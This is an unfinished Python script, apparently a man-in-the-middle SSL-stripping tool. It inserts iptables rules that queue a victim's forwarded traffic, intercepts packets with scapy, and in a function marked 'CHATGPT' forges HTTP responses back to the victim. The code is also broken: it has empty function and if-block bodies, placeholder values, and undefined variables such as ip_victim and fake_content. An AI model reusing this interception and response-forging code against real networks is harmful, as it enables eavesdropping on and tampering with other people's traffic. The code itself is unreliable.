from scapy.all import *
from netfilterqueue import NetfilterQueue
import multiprocessing
import cryptography    #required for tls
from scapy.layers.http import HTTPRequest, HTTPResponse

load_layer("tls")    #enables tls for the https connection with the server
load_layer("http")    #also useful

class SslRemover(multiprocessing.Process):

    def __init__(self, ip_victim, queue_num):
        
        multiprocessing.Process.__init__(self)

        self.queue         = NetfilterQueue()
        self.iprule_add    = "iptables -I FORWARD -p tcp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)
        self.iprule_remove = "iptables -D FORWARD -p tcp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)
        self.exit          = multiprocessing.Event()

        self.queue.bind(queue_num, self.handle_packet)

    def handle_packet(self, packet):
        packet_scapy = IP(packet_nfqueue.get_payload())

        if packet_scapy[IP].src == ip_victim and packet_scapy[IP].dst == self.ip and packet_scapy.haslayer(HTTP):
            
            

        
        packet.accept()

    def stripped_victim_automation(self):
        # socket = TCP_client.tcplink(HTTP, <>, 80)


    def tls_client_automation(self):
        greeting = TLSClientHello(ciphers=<int code of the cipher suite>)
        connection = TLSClientAutomaton(dport=50000, client_hello=ch)
        connection.run()

    def packet_callback(packet): # CHATGPT
    # Check if the packet has an HTTP layer and is a request
        if packet.haslayer(HTTPRequest):
            http_layer = packet[HTTPRequest]
            ip_layer = packet[IP]
    
            # Print the HTTP request
            print(f"HTTP Request to {http_layer.Host.decode()}{http_layer.Path.decode()}")
    
            # Create a new HTTP packet to forward the request
            new_packet = IP(src=ip_layer.src, dst=ip_layer.dst) / \
                         TCP(sport=packet[TCP].sport, dport=packet[TCP].dport, flags="PA") / \
                         HTTPRequest(
                             Method=http_layer.Method,
                             Host=http_layer.Host,
                             Path=http_layer.Path,
                             User_Agent=http_layer.User_Agent,
                             Accept=http_layer.Accept,
                             Accept_Language=http_layer.Accept_Language,
                             Accept_Encoding=http_layer.Accept_Encoding,
                             Connection=b'close'
                         )
    
            # Send the new packet
            send(new_packet)
    
            # Create a fake HTTP response
            response_packet = IP(src=ip_layer.dst, dst=ip_layer.src) / \
                              TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, flags="PA") / \
                              HTTPResponse(
                                  Content_Type=b"text/html",
                                  Content_Length=str(len(fake_content)),
                                  Server=b"FakeServer"
                              ) / \
                              fake_content
    
            # Send the fake response
            send(response_packet)
